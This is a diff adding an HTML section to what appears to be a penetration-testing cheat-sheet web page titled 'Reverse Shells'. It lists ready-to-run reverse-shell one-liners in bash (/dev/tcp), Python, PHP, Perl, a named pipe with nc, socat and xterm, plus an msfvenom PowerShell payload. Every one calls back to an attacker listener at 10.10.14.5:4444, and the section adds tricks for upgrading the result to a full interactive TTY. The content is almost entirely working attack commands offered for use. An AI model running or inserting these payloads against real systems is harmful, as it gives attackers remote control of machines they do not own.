@@ -1,0 +1,68 @@
+<div class="section" data-category="revshell">
+    <div class="section-header">
+        <div class="section-icon exploitation">🐚</div>
+        <h3>Reverse Shells</h3>
+    </div>
+    <ul class="command-list">
+        <li class="command-item">
+            <span class="cmd">bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1</span>
+            <span class="desc">Bash reverse shell</span>
+            <code class="example">$ bash -i &gt;&amp; /dev/tcp/10.10.14.5/4444 0&gt;&amp;1<br>(connects back to listener)</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">python3 -c 'import socket...'</span>
+            <span class="desc">Python reverse shell</span>
+            <code class="example">$ python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">php -r '$sock=fsockopen...'</span>
+            <span class="desc">PHP reverse shell</span>
+            <code class="example">$ php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">perl -e 'use Socket...'</span>
+            <span class="desc">Perl reverse shell</span>
+            <code class="example">$ perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");'</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh</span>
+            <span class="desc">Named pipe shell</span>
+            <code class="example">$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.5 4444 &gt;/tmp/f</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">socat TCP:IP:PORT EXEC:/bin/bash</span>
+            <span class="desc">Socat shell</span>
+            <code class="example">$ socat TCP:10.10.14.5:4444 EXEC:/bin/bash<br>(reverse shell via socat)</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">socat file:`tty`,raw,echo=0 TCP-L:4444</span>
+            <span class="desc">Socat full TTY listener</span>
+            <code class="example">$ socat file:`tty`,raw,echo=0 TCP-L:4444<br>(fully interactive TTY listener)</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">python -c 'import pty;pty.spawn("/bin/bash")'</span>
+            <span class="desc">Upgrade to PTY</span>
+            <code class="example">$ python3 -c 'import pty;pty.spawn("/bin/bash")'<br>www-data@target:/$</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">script /dev/null -c bash</span>
+            <span class="desc">TTY shell</span>
+            <code class="example">$ script /dev/null -c bash<br>www-data@target:/$ (full TTY)</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">stty raw -echo; fg</span>
+            <span class="desc">Full TTY upgrade</span>
+            <code class="example">^Z<br>$ stty raw -echo; fg<br>$ export TERM=xterm<br>(full interactive shell)</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">powershell -e base64payload</span>
+            <span class="desc">PowerShell reverse shell</span>
+            <code class="example">$ msfvenom -p cmd/windows/reverse_powershell LHOST=10.10.14.5 LPORT=4444<br>(generates encoded PS payload)</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">xterm -display IP:1</span>
+            <span class="desc">X11 reverse shell</span>
+            <code class="example">$ xterm -display 10.10.14.5:1<br>(requires Xnest listener on attacker)</code>
+        </li>
+    </ul>
+</div>
